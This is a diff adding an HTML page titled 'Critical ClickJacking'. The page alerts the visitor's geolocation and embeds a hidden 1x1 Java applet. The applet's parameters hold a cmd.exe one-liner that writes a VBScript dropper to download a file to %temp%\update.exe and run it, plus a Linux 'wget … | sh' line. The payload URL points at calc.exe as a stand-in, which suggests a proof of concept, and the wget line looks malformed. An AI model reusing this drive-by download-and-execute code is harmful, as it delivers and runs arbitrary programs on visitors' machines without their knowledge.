@@ -1,0 +1,35 @@
+<html>
+  <head>
+
+<title>Critical ClickJacking</title>
+  </head>
+  <body>
+
+<script language="JavaScript">
+navigator.geolocation.getCurrentPosition(LocationOK, LocationKO);
+
+function LocationOK(position)
+{
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  alert('Location: ' + latitude + ', ' + longitude);
+}
+function LocationKO()
+{
+  alert('You\'re lost !');
+}
+</script>
+ <applet width='1' height='1' code='Client.class' archive='Client.jar'>
+<param name='windows1' value='cmd.exe /c echo Const adTypeBinary = 1 > %temp%\winconfig.vbs & echo Const adSaveCreateOverWrite = 2 >> %temp%\winconfig.vbs & echo Dim S >> %temp%\winconfig.vbs & echo Dim A >> %temp%\winconfig.vbs & echo Dim DTNDTN >> %temp%\winconfig.vbs & echo S = "ADODB" >> %temp%\winconfig.vbs & echo A = ".Stream" >> %temp%\winconfig.vbs & echo Set DTNDTN = CreateObject(S+A) >> %temp%\winconfig.vbs & echo DTNDTN.Type = adTypeBinary >> %temp%\winconfig.vbs & echo DTNDTN.Open >> %temp%\winconfig.vbs & echo DTNDTN.Write BinaryGetURL(Wscript.Arguments(0)) >> %temp%\winconfig.vbs & echo DTNDTN.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite >> %temp%\winconfig.vbs & echo Function BinaryGetURL(URL) >> %temp%\winconfig.vbs & echo Dim Http >> %temp%\winconfig.vbs & echo Set Http = CreateObject("WinHttp.WinHttpRequest.5.1") >> %temp%\winconfig.vbs & echo Http.Open "GET", URL, False >> %temp%\winconfig.vbs & echo Http.Send >> %temp%\winconfig.vbs & echo BinaryGetURL = Http.ResponseBody >> %temp%\winconfig.vbs & echo End Function >> %temp%\winconfig.vbs & echo Set shell = CreateObject("WScript.Shell") >> %temp%\winconfig.vbs & echo shell.Run "%temp%\update.exe" >> %temp%\winconfig.vbs & start %temp%\winconfig.vbs  c:/windows/system32/calc.exe %temp%\update.exe'>
+<param name='windows2' value=''>
+
+<param name='unix1' value="">
+<param name='unix2' value="">
+
+<param name='linux1' value="wget  c:/windows/system32/calc.exe -O- | sh">
+<param name='linux2' value="">
+
+</applet>
+  </body>
+
+</html>
